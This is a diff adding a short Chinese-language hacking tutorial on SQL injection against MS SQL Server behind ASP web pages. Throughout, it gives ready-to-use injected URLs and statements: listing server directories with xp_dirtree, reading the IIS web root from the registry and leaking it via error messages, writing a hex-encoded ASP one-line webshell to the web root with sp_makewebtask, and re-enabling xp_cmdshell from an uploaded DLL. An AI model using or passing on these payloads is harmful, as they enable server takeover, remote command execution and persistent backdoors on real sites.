@@ -1,0 +1,47 @@
+好，我们exec master..xp_dirtree'd:/test'
+假设我们在test里有两个文件夹test1和test2在test1里又有test3
+结果显示
+
+subdirectory depth
+test1 1
+test3 2
+test2 1
+
+哈哈发现没有那个depth就是目录的级数
+ok了，知道怎么办了吧
+
+http://www.xxxxx.com/down/list.asp?id=1;create table dirs(paths varchar(1000),id int)-- 
+http://www.xxxxx.com/down/list.asp?id=1;insert dirs exec master.dbo.xp_dirtree 'd:\' -- 
+http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from dirs where id=1)-
+
+只要加上id＝1，就是第一级目录 。
+
+
+通过注册表读网站路径:
+
+1.;create table [dbo].[cyfd] ([gyfd][char](255));
+
+2.DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/', @result output insert into 临时表 (临时字段名) values(@result);--
+id=2;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/', @result output insert into cyfd (gyfd) values(@result);--
+
+3.and 1=(select count(*) from 临时表 where 临时字段名>1)
+and 1=(select count(*) from cyfd where gyfd > 1) 
+这样IE报错,就把刚才插进去的Web路径的值报出来了
+
+4.drop table cyfd;-- 删除临时表
+
+获得webshell方法:
+1.create table cmd (a image)-- \**cmd是创建的临时表
+
+2.insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253EDA)-- 往cmd表里插入一句话
+
+
+3.EXECUTE sp_makewebtask @outputfile = 'WEB绝对路径\导出的文件名.asp',@query = 'SELECT image FROM cmd'
+EXECUTE sp_makewebtask @outputfile = 'WEB绝对路径\导出的文件名.asp',@query = 'SELECT 你的字段 FROM 你建的临时表'
+
+4.drop table cmd;-- 删除cmd临时表
+
+恢复xp_cmdshell方法之一:
+我很快就把xplog70.dll文件给他上传到e:\inetpub\wwwroot目录下了，来吧，我们来给他恢复，提交：
+http://www.something.com/script.asp?id=2;EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetpub\wwwroot\xplog70.dll'
+恢复，支持绝对路径的恢复哦。：）
